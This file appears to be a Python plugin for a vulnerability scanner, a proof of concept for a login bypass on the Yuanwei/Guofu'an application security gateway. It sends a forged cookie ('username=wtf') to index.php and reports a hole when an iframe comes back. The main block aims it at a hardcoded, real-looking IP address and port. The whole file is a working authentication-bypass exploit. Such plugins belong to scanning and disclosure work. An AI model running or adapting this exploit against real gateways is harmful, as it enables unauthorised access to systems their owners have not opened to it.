#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 远为应用安全网关(&国富安应用安全网关)登录绕过
refer:
description:
    cookie: username=WTF
    这登录判断也是没谁了
'''

import re
import urlparse


def assign(service, arg):
    if service == 'yuanwei_gateway':
        return True, arg

def audit(arg):
    cookie = 'username=wtf'
    code, head, res, err, _ = curl.curl2(arg+'index.php', cookie=cookie)
    if (code == 200) and ('<iframe ' in res):
        security_hole('Bypass authority: ' + arg + ' Cookie: '+cookie)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('yuanwei_gateway','http://222.170.47.230:8888/')[1])